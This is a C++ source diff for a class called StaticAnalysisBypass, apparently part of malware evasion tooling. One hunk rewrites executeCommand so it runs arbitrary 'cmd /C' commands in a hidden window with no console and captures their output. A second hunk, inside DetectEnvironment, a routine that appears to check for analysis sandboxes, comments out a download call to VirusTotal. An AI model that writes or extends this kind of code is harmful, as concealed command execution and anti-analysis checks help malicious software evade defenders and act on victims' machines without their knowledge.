@@ -1,18 +1,47 @@
 #include "StaticAnalysisBypass.h"
 
-std::string StaticAnalysisBypass::executeCommand(const char* cmd)
+std::string StaticAnalysisBypass::executeCommand(std::string command)
 {
-    std::array<char, 128> buffer;
-    std::string           result;
+    HANDLE              hRead, hWrite;
+    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
 
-    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
-    if (!pipe)
-        throw std::runtime_error("popen() failed!");
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+        throw std::runtime_error("Failed to create pipe.");
 
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
+    STARTUPINFOA        si = {sizeof(STARTUPINFOA)};
+    PROCESS_INFORMATION pi;
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdOutput = hWrite;
+    si.hStdError = hWrite;
+    si.wShowWindow = SW_HIDE;
+
+    std::string cmd = "cmd /C " + command;
+    BOOL        success = CreateProcessA(NULL, &cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    if (!success)
     {
-        result += buffer.data();
+        CloseHandle(hWrite);
+        CloseHandle(hRead);
+        throw std::runtime_error("Failed to execute command.");
     }
+
+    CloseHandle(hWrite);
+
+    char        buffer[128];
+    DWORD       bytesRead;
+    std::string result;
+
+    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
+    {
+        buffer[bytesRead] = 0;
+        result += buffer;
+    }
+
+    CloseHandle(hRead);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
     return result;
 }
 
@@ -105,7 +134,7 @@ bool StaticAnalysisBypass::DetectEnvironment()
             return true;
     }
     
-    HRESULT hr = URLDownloadToFileA(NULL, "https://www.virustotal.com/", NULL, 0, NULL);
+    //HRESULT hr = URLDownloadToFileA(NULL, "https://www.virustotal.com/", NULL, 0, NULL);
     return false;
 }
 
